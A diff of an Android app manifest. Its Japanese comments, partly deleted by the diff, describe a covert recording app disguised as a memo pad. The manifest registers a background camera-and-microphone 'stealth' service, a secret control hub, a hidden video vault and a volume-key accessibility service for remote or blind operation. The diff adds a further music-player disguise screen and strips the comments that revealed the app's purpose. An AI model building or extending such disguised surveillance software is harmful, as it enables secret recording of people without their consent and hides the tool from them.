@@ -1,6 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">                                                   
-    <!-- 証拠収集に必要な権限群 -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
@@ -9,9 +8,7 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <!-- Android 13以降の通知権限 -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-    <!-- 盲牌操作のフィードバックに必要な振動権限 -->
     <uses-permission android:name="android.permission.VIBRATE" />
 
     <uses-feature android:name="android.hardware.camera" android:required="true" />                                     
@@ -22,7 +19,6 @@
         android:supportsRtl="true"
         android:usesCleartextTraffic="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">                                                                                                                           
-        <!-- 偽装用メイン画面（表の顔：メモ帳） -->
         <activity
             android:name=".ui.MainActivity"
             android:exported="true">
@@ -32,29 +28,29 @@
             </intent-filter>
         </activity>
 
-        <!-- クライアント（遠隔操作）画面 -->
         <activity
             android:name=".ui.ClientActivity"
             android:exported="false" />
 
-        <!-- 秘密のコントロールハブ画面 -->
+        <!-- ★追加：音楽プレイヤー偽装画面の登録 -->
+        <activity
+            android:name=".ui.ClientCamoActivity"
+            android:exported="false" />
+
         <activity
             android:name=".ui.SecretMenuActivity"
             android:exported="false" />
 
-        <!-- 追加：シークレット動画金庫（Vault）画面 -->
         <activity
             android:name=".ui.VaultActivity"
             android:exported="false" />
 
-        <!-- バックグラウンド常駐・録画サービス -->
         <service
             android:name=".ui.StealthCameraService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="camera|microphone" />
 
-        <!-- 音量キー監視用ユーザー補助サービス（クライアン ト遠隔操作用） -->
         <service
             android:name=".ui.VolumeKeyTriggerService"
             android:enabled="true"
@@ -67,6 +63,5 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
         </service>
-
     </application>
 </manifest>
